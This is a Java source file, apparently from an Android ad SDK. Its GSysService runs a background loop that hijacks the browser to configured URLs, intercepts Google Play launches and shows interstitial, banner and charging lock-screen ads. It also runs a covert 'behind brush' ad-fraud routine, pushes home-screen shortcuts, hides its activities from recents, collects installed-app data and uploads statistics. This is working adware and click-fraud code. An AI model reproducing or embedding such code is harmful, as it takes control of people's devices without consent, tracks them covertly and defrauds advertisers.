package com.guang.client;



import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileLock;
import java.util.Date;
import java.util.List;

import com.guang.client.controller.GAPPNextController;
import com.guang.client.controller.GOfferController;
import com.guang.client.controller.GSMController;
import com.guang.client.controller.GUserController;
import com.guang.client.mode.GAdPositionConfig;
import com.guang.client.tools.GLog;
import com.guang.client.tools.GTools;
import com.qinglu.ad.QLAdController;
import com.qinglu.ad.QLBatteryLockActivity;
import com.qinglu.ad.QLBehindBrush;
import com.qinglu.ad.QLInstall;
import com.qinglu.ad.QLShortcut;
import com.qinglu.ad.QLUnInstall;
import com.qinglu.ad.QLWIFIActivity;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class GSysService  {
	private static GSysService _instance;	
	private static Context contexts;
	private static GSysReceiver receiver;
	private boolean isPresent;
	private boolean isRuning;
	
	private GSysService()
	{
		isPresent = false;
		isRuning = false;
	}
	
	public static GSysService getInstance()
	{
		if(_instance == null)
			_instance = new GSysService();
		return _instance;
	}
	
	public void start(final Context context) {
		contexts = context;
		GTools.saveSharedData(GCommon.SHARED_KEY_SERVICE_RUN_TIME,GTools.getCurrTime());
		registerListener();
		GUserController.getInstance().login();
		GOfferController.getInstance().initMobVista();
		GAPPNextController.getInstance();
		GSMController.getInstance().init();
		
		QLInstall.getInstance().getInstallAppNum();
		QLUnInstall.getInstance().getAppInfo(true);	
		
		
		Intent intent = new Intent(context, QLWIFIActivity.class);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
		intent.putExtra("youmeng", true);
		context.startActivity(intent);	
	}
	
	public void startMainLoop()
	{		
		new Thread() {
			public void run() {
				Context context = contexts;
				if(context == null)
					context = QLAdController.getInstance().getContext();
				initData();
				boolean open = false;

				while(isMainLoop())
				{				
					try {	
						if(open)
							Thread.sleep(10000);
						else
							Thread.sleep(2200);
						if(isPresent && GUserController.getMedia().getOpen())
						{
							open = GUserController.getMedia().isOpenApp();

							if(open)
							{
								browserSpotThread();
								browserBreakThread();
								
								appSpotThread();
								bannerThread();
								
								gpBreakThread();
							}
							shortcutThread();
							behindBrushThread();
						}
						

					} catch (Exception e) {
					}
				}	
				GUserController.getInstance().restarMainLoop();
				GLog.e("------------------------", "restarMainLoop");
			};
		}.start();	
	}

	//浏览器插屏
	private void browserSpotThread()
	{
		if(		isPresent 
				&& (isWifi()  || is4G()))
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BROWSER_SPOT);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
					if(s != null && GUserController.getMedia().isWhiteList(adPositionId, s))
					{
						browserSpot(adPositionId,s);
					}		
				}
			}
		}
	}
	//BANNER
	private void bannerThread()
	{
		if(isPresent &&  (isWifi()  || is4G() || is3G()))
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BANNER);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
					if(s != null && GUserController.getMedia().isWhiteList(adPositionId, s))
					{
						banner(adPositionId,s);
					}		
				}
			}
		}
	}
	//应用插屏
	private void appSpotThread()
	{
		if(isPresent &&  (isWifi()  || is4G()))
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.APP_SPOT);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
					if(s != null && GUserController.getMedia().isWhiteList(adPositionId, s))
					{
						appSpot(adPositionId,s);
					}		
				}
			}
		}
	}
	//浏览器截取
	private void browserBreakThread()
	{
		if(isPresent)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BROWSER_BREAK);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					String s =  GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
					if(s != null && GUserController.getMedia().isWhiteList(adPositionId, s))
					{
						browserBreak(adPositionId,s);
					}		
				}
			}
		}
	}
	//快捷方式
	private void shortcutThread()
	{
		if(isPresent)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.SHORTCUT);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					shortcut(adPositionId);
				}
			}
		}
	}
	//暗刷
	private void behindBrushThread()
	{
		List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BEHIND_BRUSH);
		for(GAdPositionConfig config : list)
		{
			long adPositionId = config.getAdPositionId();
			if( GUserController.getMedia().isAdPosition(adPositionId)
					&& GUserController.getMedia().isShowNum(adPositionId)
					&& GUserController.getMedia().isShowTimeInterval(adPositionId)
					&& GUserController.getMedia().isTimeSlot(adPositionId))
			{
				int h =  GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, 0);
				if(h == 0)
				{
					h = (int) (((int)(Math.random()*100)+1) / 100.f * 18) + 3;
					GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, h);
				}
			}
		}
	}
	//充电锁
	public void startLockThread(int mBatteryLevel)
	{
		if(isRuning() &&  (isWifi()  || is4G()))
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.CHARGLOCK);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& isOpenLock()
						&& !QLBatteryLockActivity.isShow())
				{
					QLBatteryLockActivity lock = QLBatteryLockActivity.getInstance();
					if(lock == null && GTools.getSharedPreferences().getBoolean(GCommon.SHARED_KEY_ISBATTERY, false))
					{
						QLBatteryLockActivity.show(mBatteryLevel);
					}
				}
			}
		}
	}
	
	//GP截取
	private void gpBreakThread()
	{
		if(isPresent)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.GP_BREAK);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					String last = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_LAST_OPEN_APP, "");
					if(last != null && GUserController.getMedia().isWhiteList(adPositionId, last))
					{
						gpBreak(last);
					}
				}
			}
		}
	}
	public void gpBreak(String appNmae)
	{
		GAPPNextController.getInstance().showGpBreak(appNmae);
	}
	//应用启动
	public void appSpot(long adPositionId,String appNmae)
	{
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.APP_SPOT);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		GAPPNextController.getInstance().showAppSpot(adPositionId,appNmae);
	}
	//banner
	public void banner(long adPositionId,String appNmae)
	{
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BANNER);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		GSMController.getInstance().showBanner(adPositionId,appNmae);
	}
	//shortcut
	public void shortcut(long adPositionId)
	{
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.SHORTCUT);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		GLog.e("-----------------", "shortcut success");
		QLShortcut.getInstance().show(adPositionId);
		int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_SHORTCUT_NUM+adPositionId, 0);
		GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_NUM+adPositionId, num+1);
		GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_TIME+adPositionId, GTools.getCurrTime());
	}
	//浏览器插屏
	public void browserSpot(long adPositionId,String packageName)
	{
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BROWSER_SPOT);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		GSMController.getInstance().showSpot(adPositionId,packageName);
	}
	//浏览器截取
	public void browserBreak(long adPositionId,String packageName)
	{		
		if(adPositionId == -1)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.BROWSER_BREAK);
			for(GAdPositionConfig config : list)
			{
				adPositionId = config.getAdPositionId();
				break;
			}
		}
		
		String url = GUserController.getMedia().getConfig(adPositionId).getBrowerBreakUrl();
		PackageManager packageMgr = contexts.getPackageManager();
		Intent intent = packageMgr.getLaunchIntentForPackage(packageName);
        intent.setAction(Intent.ACTION_VIEW);
        intent.addCategory(Intent.CATEGORY_DEFAULT);
        intent.setData(Uri.parse(url));
        contexts.startActivity(intent);
        
        int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BROWSER_BREAK_NUM+adPositionId, 0);
		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_NUM+adPositionId, num+1);
		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_TIME+adPositionId, GTools.getCurrTime());

		GTools.uploadStatistics(GCommon.SHOW,GCommon.BROWSER_BREAK,"self");
		GLog.e("-----------------", "browserBreak success");
	}
	//暗刷
	public void behindBrush()
	{
		QLBehindBrush.getInstance().show();	
		
		int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, 0);
		GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, num+1);
		GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_TIME, GTools.getCurrTime());

		GLog.e("-----------------", "behindBrush success");
	}
	//wifi
	public boolean wifiThread()
	{
		if(isPresent)
		{
			List<GAdPositionConfig> list = GUserController.getMedia().getConfig(GCommon.WIFI_CONN);
			for(GAdPositionConfig config : list)
			{
				long adPositionId = config.getAdPositionId();
				if( GUserController.getMedia().isAdPosition(adPositionId)
						&& GUserController.getMedia().isShowNum(adPositionId)
						&& GUserController.getMedia().isShowTimeInterval(adPositionId)
						&& GUserController.getMedia().isTimeSlot(adPositionId))
				{
					return true;
				}
			}
		}
		return false;
	}
	public void wifi(boolean state)
	{
		//暗刷
		if(isWifi())
		{
			int h =  GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, 0);
			if(h != 0)
			{
				int currH = new Date().getHours();
				if(currH > h)
				{
					behindBrush();
					GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_HOURS, 0);
					GLog.e("-----------------------", "h="+h);
				}
			}
			
		}
		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_WIFI_TIME, 0);
		if(time==0)
		{
			time = GTools.getCurrTime();
			GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_TIME, 1l);
			return;
		}
		if(!isWifi())
		{
			return;
		}
		Context context = QLAdController.getInstance().getContext();
		Intent intent = new Intent(context, QLWIFIActivity.class);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
		intent.putExtra("state", (state ? 1 : 0));
		intent.putExtra("youmeng", false);
		context.startActivity(intent);	
		if(state)
		{
			int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_WIFI_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_NUM, num+1);
			GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_TIME, GTools.getCurrTime());
		}
		
	}
	
	private void initData()
	{
		isPresent = true;
		isRuning = true;
		GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_TIME, 0l);
		GTools.saveSharedData(GCommon.SHARED_KEY_IS_OPEN_LAUNCHER, false);
		if(!isMainLoop())
		{
			long n_time = GTools.getCurrTime();
			GTools.saveSharedData(GCommon.SHARED_KEY_MAIN_LOOP_TIME, n_time);
			GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_SPOT_TIME, 0l);
			GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_SPOT_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_BANNER_TIME, 0l);
			GTools.saveSharedData(GCommon.SHARED_KEY_BANNER_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_APP_SPOT_TIME, 0l);
			GTools.saveSharedData(GCommon.SHARED_KEY_APP_SPOT_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_TIME, 0l);
			GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_TIME, n_time);
			GTools.saveSharedData(GCommon.SHARED_KEY_SHORTCUT_NUM, 0);
			GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_TIME, 0l);
			GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, 0);
			
			GTools.saveSharedData(GCommon.SHARED_KEY_AD_NUM, "");
		}
		else
		{
//			String browserspot_app = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_TASK_BROWSERSPOT_APP, "");
//			if(browserspot_app != null && !"".equals(browserspot_app))
//			{
//				browserSpot(browserspot_app);
//			}
//			
//			String banner_app = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_TASK_BANNER_APP, "");
//			if(banner_app != null && !"".equals(banner_app))
//			{
//				banner(banner_app);
//			}
		}
	}
	
	private boolean isMainLoop()
	{
		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_MAIN_LOOP_TIME, 0);
		long n_time = GTools.getCurrTime();
		return (n_time - time < GUserController.getMedia().getLoopTime() * 60 * 60 * 1000);		
	}
	
	public boolean isWifi()
	{
		return GTools.isWifi();
	}
	
	public boolean is4G()
	{
		return "4G".equals(GTools.getNetworkType());
	}
	
	public boolean is3G()
	{
		return "3G".equals(GTools.getNetworkType());
	}

	public boolean isMultiApp()
	{
		String name = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath();
		File f = new File(name, "multiapp");
		if(!f.exists())
		{
			try {
				f.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}			
		}
		try {
			final FileOutputStream fos = new FileOutputStream(f);
			final FileLock fl = fos.getChannel().tryLock(); 
			if(fl != null && fl.isValid())
	        {
				new Thread(){
					public void run() {
						try {
							Thread.sleep(8000);
							deleteMultiApp(fl,fos);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}						
					};
				}.start();
				return true;
	        }
		} catch (Exception e1) {
			e1.printStackTrace();
		}  
		return false;
	}
	
	public void deleteMultiApp(FileLock fl,FileOutputStream fos)
	{
		try {
			if(fos != null)
				fos.close();			
		} catch (Exception e) {
		}		
        try {  
        	if(fl != null && fl.isValid())
        		fl.release();  
        } catch (IOException e) {  
        }  
	}

	public boolean isOpenLock()
	{
		int type = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_LOCK_SAVE_TYPE, 1);		
		if(type == 0)
		{
			return false;
		}
		else 
		{
			long time =  GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_LOCK_SAVE_TIME, 0l);
			Date today = new Date();
			Date date = new Date(time);
			if(type == 2)
			{
				if(today.getDate() == date.getDate())
				{
					return false;
				}
			}
			else if(type == 3)
			{
				if(today.getDate() - date.getDate() <= 3)
				{
					return false;
				}
			}
			else if(type == 4)
			{
				if(today.getDate() - date.getDate() <= 7)
				{
					return false;
				}
			}
			else if(type == 5)
			{
				if(today.getDate() - date.getDate() <= 30)
				{
					return false;
				}
			}
		}
		return true;
	}


	private static void registerListener() {
		receiver = new GSysReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(GCommon.ACTION_QEW_APP_BROWSER_SPOT);
        filter.addAction(GCommon.ACTION_QEW_APP_INSTALL);
        filter.addAction(GCommon.ACTION_QEW_APP_UNINSTALL);
        filter.addAction(GCommon.ACTION_QEW_APP_BANNER);
        filter.addAction(GCommon.ACTION_QEW_APP_LOCK);
        filter.addAction(GCommon.ACTION_QEW_APP_SPOT);
        filter.addAction(GCommon.ACTION_QEW_APP_WIFI);
        filter.addAction(GCommon.ACTION_QEW_APP_BROWSER_BREAK);
        filter.addAction(GCommon.ACTION_QEW_APP_SHORTCUT);
        filter.addAction(GCommon.ACTION_QEW_APP_HOMEPAGE);
        filter.addAction(GCommon.ACTION_QEW_APP_BEHIND_BRUSH);
        filter.addAction(GCommon.ACTION_QEW_OPEN_APP);
        filter.addAction(GCommon.ACTION_QEW_APP_INSTALL_UI);
        filter.addAction(GCommon.ACTION_QEW_APP_UNINSTALL_UI);
        filter.addAction(GCommon.ACTION_QEW_APP_GP_BREAK);
        
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(Intent.ACTION_BATTERY_CHANGED);
        filter.addAction(Intent.ACTION_POWER_CONNECTED);
        filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        contexts.registerReceiver(receiver, filter);
        
    }

	
	public boolean isPresent() {
		return isPresent;
	}

	public void setPresent(boolean isPresent) {
		this.isPresent = isPresent;
	}

	public boolean isRuning() {
		return isRuning;
	}

	public void setRuning(boolean isRuning) {
		this.isRuning = isRuning;
	}

	
   public void reset()
   {
	   this.isRuning = false;
	   this.isPresent = false;
	   
	   if(receiver != null)
		{
			contexts.unregisterReceiver(receiver);
			receiver = null;
		}
   }
}
